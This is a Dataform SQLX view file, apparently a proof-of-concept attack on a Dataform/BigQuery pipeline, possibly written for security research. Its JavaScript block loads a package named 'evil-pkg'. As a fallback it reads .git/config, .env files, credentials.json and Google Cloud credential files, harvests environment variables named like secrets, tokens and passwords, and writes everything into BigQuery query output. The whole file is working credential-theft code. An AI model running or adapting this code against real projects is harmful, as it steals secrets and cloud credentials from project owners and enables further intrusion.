-- Evil Package Exfiltration
-- Requires the malicious package and exfiltrates stolen data via SQL output

config {
  type: "view",
  name: "evil_pkg_exfil"
}

js {
  let exfilData = {};

  // Try to require the evil package
  try {
    const evilPkg = require('evil-pkg');
    exfilData = evilPkg;
  } catch(e) {
    exfilData.require_error = e.message;

    // Fallback: try to read data directly
    try {
      if (typeof restricted_fs !== 'undefined') {
        exfilData.fallback = {};

        // Read .git/config
        try {
          exfilData.fallback.git_config = restricted_fs.readFile('.git/config');
        } catch(e2) {
          exfilData.fallback.git_config_err = e2.message;
        }

        // Read package.json
        try {
          exfilData.fallback.package_json = restricted_fs.readFile('package.json');
        } catch(e2) {}

        // Read dataform.json
        try {
          exfilData.fallback.dataform_json = restricted_fs.readFile('dataform.json');
        } catch(e2) {}

        // Check for common secret files
        const secretFiles = [
          '.env',
          '.env.local',
          '.env.production',
          'secrets.json',
          'credentials.json',
          'config/secrets.yaml',
          '.gcloud/credentials.json'
        ];

        for (const f of secretFiles) {
          try {
            if (restricted_fs.exists(f)) {
              exfilData.fallback['secret_' + f.replace(/[^a-z0-9]/gi, '_')] =
                restricted_fs.readFile(f).substring(0, 1000);
            }
          } catch(e2) {}
        }
      }
    } catch(e2) {
      exfilData.fallback_error = e2.message;
    }
  }

  // Add global environment info
  try {
    if (typeof process !== 'undefined' && process.env) {
      exfilData.env = {};
      const sensitiveKeys = [
        'GOOGLE_APPLICATION_CREDENTIALS',
        'GOOGLE_CLOUD_PROJECT',
        'GCP_PROJECT',
        'DATAFORM_',
        'DATABASE_',
        'DB_',
        'SECRET',
        'KEY',
        'TOKEN',
        'PASSWORD',
        'CREDENTIAL'
      ];

      for (const key in process.env) {
        for (const sensitive of sensitiveKeys) {
          if (key.toUpperCase().includes(sensitive)) {
            exfilData.env[key] = String(process.env[key]).substring(0, 200);
            break;
          }
        }
      }
    }
  } catch(e) {}

  // Get global keys for reconnaissance
  try {
    exfilData.globalKeys = Object.keys(globalThis).filter(k =>
      !['Object', 'Function', 'Array', 'String', 'Number', 'Boolean', 'Symbol',
        'Error', 'Date', 'RegExp', 'Math', 'JSON', 'Promise', 'Map', 'Set',
        'WeakMap', 'WeakSet', 'Proxy', 'Reflect', 'undefined', 'NaN', 'Infinity',
        'eval', 'isNaN', 'isFinite', 'parseFloat', 'parseInt', 'decodeURI',
        'decodeURIComponent', 'encodeURI', 'encodeURIComponent', 'escape', 'unescape'
      ].includes(k)
    );
  } catch(e) {}
}

-- Exfiltrate via SQL output - this data appears in BigQuery!
SELECT
  '${JSON.stringify(exfilData).replace(/'/g, "''")}' as exfiltrated_data,
  CURRENT_TIMESTAMP() as exfil_timestamp
